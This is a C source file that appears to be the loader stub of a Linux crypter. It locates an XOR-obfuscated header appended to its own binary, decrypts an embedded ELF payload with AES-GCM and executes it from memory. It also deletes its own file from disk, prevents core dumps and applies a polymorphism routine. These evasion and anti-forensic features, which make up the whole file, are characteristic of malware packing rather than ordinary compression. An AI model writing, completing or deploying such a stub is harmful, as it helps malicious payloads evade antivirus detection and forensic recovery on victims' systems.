#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "common.h"
#include "elf64.h"
#include "crypto.h"

static uint8_t* find_packed_header(uint8_t* data, size_t data_size,
                                   pack_header_t* header) {
    if (!data || !header || data_size < sizeof(pack_header_t)) return NULL;

    uint32_t needle = g_packed_magic;
    size_t offset = data_size - sizeof(pack_header_t);
    for (;;) {
        uint32_t candidate_magic;
        memcpy(&candidate_magic, data + offset, sizeof(candidate_magic));
        if (candidate_magic == needle) {
            size_t payload_size = data_size - offset - sizeof(*header);
            memcpy(header, data + offset, sizeof(*header));
            for (size_t i = sizeof(uint32_t); i < sizeof(*header); i++)
                ((uint8_t*)header)[i] ^=
                    g_pack_polymorph[i - sizeof(uint32_t)];
            if (pack_header_valid(header, payload_size))
                return data + offset;
            secure_memory_wipe(header, sizeof(*header));
        }
        if (offset == 0) break;
        offset--;
    }
    return NULL;
}

int main(int argc, char* argv[], char* envp[]) {
    FILE* self_fp;
    uint8_t* self_data;
    uint8_t* header_data;
    size_t self_size;
    pack_header_t header;
    int result = 1;

    (void)argc;
    memset(&header, 0, sizeof(header));
    prevent_core_dumps();
    harmless_text_polymorph();

    self_fp = fopen("/proc/self/exe", "rb");
    if (!self_fp) {
        DBG("cannot open /proc/self/exe\n");
        return 1;
    }

#ifndef KEEP_PACKED_FILE
    unlink(argv[0]);
#endif
    if (fseek(self_fp, 0, SEEK_END) != 0) {
        DBG("cannot determine self size\n");
        fclose(self_fp);
        return 1;
    }
    long self_length = ftell(self_fp);
    if (self_length <= 0 || fseek(self_fp, 0, SEEK_SET) != 0) {
        DBG("invalid self size\n");
        fclose(self_fp);
        return 1;
    }
    self_size = (size_t)self_length;

    self_data = (uint8_t*)malloc(self_size);
    if (!self_data) {
        DBG("cannot allocate self buffer\n");
        fclose(self_fp);
        return 1;
    }
    if (fread(self_data, 1, self_size, self_fp) != self_size) {
        DBG("short read from /proc/self/exe\n");
        fclose(self_fp);
        secure_memory_wipe(self_data, self_size);
        free(self_data);
        return 1;
    }
    fclose(self_fp);

    header_data = find_packed_header(self_data, self_size, &header);
    if (!header_data) {
        DBG("packed header not found\n");
        goto cleanup;
    }

    size_t header_offset = (size_t)(header_data - self_data);
    size_t payload_offset = header_offset + sizeof(pack_header_t);
    size_t executable_size = header.original_size;

    secure_memory_wipe(header_data, sizeof(header));
    memmove(self_data, self_data + payload_offset, executable_size);
    if (!aes256_gcm_decrypt(self_data, executable_size, header.key, header.iv,
                            header.tag)) {
        DBG("payload authentication/decryption failed\n");
        goto cleanup;
    }
    if (executable_size < sizeof(Elf64_Ehdr) || !is_elf64(self_data)) {
        DBG("decrypted payload is not ELF64\n");
        goto cleanup;
    }

    secure_memory_wipe(&header, sizeof(header));
    if (execute_from_memory(self_data, executable_size, argv, envp) < 0) {
        DBG("in-memory execution failed\n");
        goto cleanup;
    }
    result = 0;

cleanup:
    secure_memory_wipe(&header, sizeof(header));
    secure_memory_wipe(self_data, self_size);
    free(self_data);
    return result;
}
